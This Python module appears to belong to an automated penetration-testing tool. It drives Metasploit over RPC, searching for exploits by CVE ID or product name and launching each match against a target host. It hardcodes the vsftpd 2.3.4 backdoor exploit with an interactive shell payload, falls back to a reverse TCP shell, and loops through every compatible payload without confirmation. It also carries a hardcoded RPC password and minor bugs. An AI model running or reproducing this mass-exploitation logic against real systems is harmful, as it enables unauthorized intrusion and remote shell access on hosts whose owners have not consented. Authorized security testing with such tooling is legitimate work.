from typing import Any, Dict, List
from time import sleep

from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('password', ssl=True)

def search_exploits(vulnerability: Dict[str, Any], log) -> List[str]:
    """
    Search for exploits related to a given vulnerability using Metasploit.
    
    :param vulnerability: A dictionary containing vulnerability details.
    :param log: Logger object for logging.
    :return: A list of exploit module names.
    """
    log.logger("info", f"Searching for exploits related to {vulnerability['CVEID']}")
    
    exploits = client.modules.search(vulnerability['CVEID'])
    exploit_names = [exploit['fullname'] for exploit in exploits if exploit['type'] == 'exploit']
    
    log.logger("info", f"Found {len(exploit_names)} exploits for {vulnerability['CVEID']}")
    return exploit_names

def exploit_vulnerability(vulnerability: Dict[str, Any], target: str, log) -> None:
    """
    Exploit a given vulnerability on the target.
    
    :param vulnerability: A dictionary containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    """
    log.logger("info", f"Exploiting {vulnerability['CVEID']} on {target}")
    
    # Example exploit logic using Metasploit
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = target
    payload = client.modules.use('payload', 'cmd/unix/interact')
    exploit.execute(payload=payload)

def exploit_vulnerabilities(vulnerabilities: List[Dict[str, Any]], target: str, log, console2) -> None:
    """
    Exploit a list of vulnerabilities on the target.
    
    :param vulnerabilities: A list of dictionaries containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    """
    for vulnerability in vulnerabilities:
        if isinstance(vulnerability, dict):
            exploit_names = search_exploits(vulnerability, log)
            sleep(1)  # Adding a delay to ensure proper logging and execution
            if exploit_names:
                for exploit_name in exploit_names:
                    with console2.status(
                        f"[white]Using exploit {exploit_name} for[/white] [red]{vulnerability['CVEID']}[/red] [white]...[/white]",
                        spinner="bouncingBar"
                    ) as status:
                        log.logger("info", f"Using exploit {exploit_name} for {vulnerability['CVEID']}")
                        exploit = client.modules.use('exploit', exploit_name)
                        exploit['RHOSTS'] = target
                        compatible_payloads = exploit.targetpayloads()
                        if compatible_payloads:
                            for payload_name in compatible_payloads:
                                try:
                                    try:
                                        payload = client.modules.use('payload', payload_name)
                                        exploit.execute(payload=payload)
                                        break
                                    except ValueError as e:
                                        log.logger("error", f"Payload {payload_name} failed: {e}")
                                except Exception as e:
                                    log.logger("error", f"An error occurred while executing payload {payload_name}: {e}")
                        else:
                            log.logger("error", f"No compatible payloads found for exploit {exploit_name}. Trying default payload.")
                            try:
                                payload = client.modules.use('payload', 'generic/shell_reverse_tcp')
                                exploit.execute(payload=payload)
                            except Exception as e:
                                log.logger("error", f"Default payload failed: {e}")
                        sleep(1)  # Adding a delay to ensure proper logging and execution
            else:
                log.logger("info", f"No Metasploit exploits found for {vulnerability['CVEID']}")
        elif isinstance(vulnerability, list) and len(vulnerability) >= 3:
            target_ip, port, service, product, version = vulnerability
            keywords = []
            if product:
                keywords.append(product)
            if product:
                keywords.append(product)
            for keyword in keywords:
                log.logger("info", f"Searching for exploits related to {keyword}")
                exploits = client.modules.search(keyword)
                exploit_names = [exploit['fullname'] for exploit in exploits if exploit['type'] == 'exploit']
                for exploit_name in exploit_names:
                    log.logger("info", f"Using exploit {exploit_name} for {keyword}")
                    exploit = client.modules.use('exploit', exploit_name)
                    exploit['RHOSTS'] = target
                    payload = client.modules.use('payload', 'cmd/unix/interact')
                    exploit.execute(payload=payload)
        else:
            log.logger("error", f"Invalid vulnerability format: {vulnerability}")
